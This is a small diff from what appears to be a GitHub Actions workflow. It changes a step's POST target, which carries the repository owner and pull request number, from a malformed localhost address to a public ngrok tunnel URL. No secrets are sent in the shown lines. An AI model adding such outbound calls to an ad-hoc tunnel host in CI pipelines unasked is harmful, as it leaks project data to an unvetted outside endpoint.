@@ -24,4 +24,4 @@ jobs:
               "owner": "${{ github.repository_owner }}",
               "pr_number": "${{ github.event.pull_request.number }}"
             }' \
-            http://localhost:8090.com
+            https://973e-4-78-254-114.ngrok-free.app
